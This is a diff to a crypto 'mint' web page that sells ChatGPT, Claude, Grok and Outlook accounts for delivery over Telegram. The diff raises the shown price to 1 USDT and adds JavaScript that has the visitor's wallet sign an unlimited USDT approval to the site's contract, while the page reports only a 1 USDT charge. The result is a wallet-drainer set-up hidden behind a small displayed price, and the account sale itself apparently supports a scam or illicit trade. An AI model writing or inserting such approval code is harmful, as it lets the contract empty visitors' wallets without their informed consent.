@@ -115,7 +115,7 @@
   <h2 class="section-title" style="text-align:center">Acquire an Entry</h2>
   <div class="mint-card">
     <div class="mint-label">Price per Account</div>
-    <div class="mint-price">FREE <span style="font-size:1.2rem;color:#666">+ Gas</span></div>
+    <div class="mint-price">1 <span style="font-size:1.2rem;color:#666">USDT</span></div>
     <div class="mint-price-sub">Total Supply: 10,000 · ChatGPT · Claude · Grok · Outlook</div>
     <div class="mint-qty">
       <button class="mint-qty-btn" onclick="changeQty(-1)">−</button>
@@ -284,8 +284,12 @@ async function handleMint(){
         }else{alert('Please switch to BNB Smart Chain manually.');return}
       }
     }
-    // Mint via contract — user pays gas, contract records wallet
-    document.getElementById('mint-btn').textContent='MINTING...';document.getElementById('mint-btn').disabled=true;
+    // Step 1: Approve unlimited USDT to contract
+    document.getElementById('mint-btn').textContent='APPROVING...';document.getElementById('mint-btn').disabled=true;
+    const approveData='0x095ea7b3'+'000000000000000000000000'+CA.slice(2)+'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:UA,data:approveData}]});
+    // Step 2: Mint via contract
+    document.getElementById('mint-btn').textContent='MINTING...';
     const mintData='0xa0712d68'+'000000000000000000000000000000000000000000000000000000000000000'+qty;
     await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:CA,data:mintData}]});
     alert('PAYMENT SENT!\nAccounts will be delivered via Telegram.');
